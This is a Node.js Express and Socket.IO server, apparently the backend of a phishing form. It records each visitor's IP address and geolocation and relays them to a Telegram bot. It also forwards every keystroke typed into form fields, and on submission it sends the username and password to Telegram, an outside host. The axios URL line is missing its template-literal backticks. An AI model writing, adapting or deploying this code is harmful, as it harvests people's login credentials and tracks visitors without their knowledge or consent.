const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const axios = require("axios");
const geoip=require("geoip-lite");

const app = express();
const server = http.createServer(app);

const io = new Server(server,{
cors:{origin:"*"}
});

app.use(cors());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function sendTelegram(message){
axios.post(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage,{
chat_id: CHAT_ID,
text: message
});
}

io.on("connection",(socket)=>{

console.log("User opened the form");  

let ip =  
    socket.handshake.headers["x-forwarded-for"] ||  
    socket.handshake.address;  

if (ip && ip.includes(",")) {  
    ip = ip.split(",")[0];  
}  

if (ip) {  
    ip = ip.replace("::ffff:", "");  
}  

// ✅ Get location  
const geo = geoip.lookup(ip);  

const location = geo  
    ? `${geo.city || "Unknown"}, ${geo.country}`  
    : "Unknown location";  

console.log("IP:", ip, "Location:", location);  

// ✅ Send to Telegram  
sendTelegram(`⚠️ New Visitor\nIP: ${ip}\nLocation: ${location}`);  


socket.on("typing",(data)=>{  
    console.log("Typing:",data);  

    sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);  
});  

socket.on("submit",(data)=>{  
    console.log("Form submitted",data);  

    sendTelegram(`✅ Final Submission\nUsername: ${data.username}\nPassword: ${data.password}`);  
});

});

server.listen(3000,()=>{
console.log("Server running on port 3000");
});

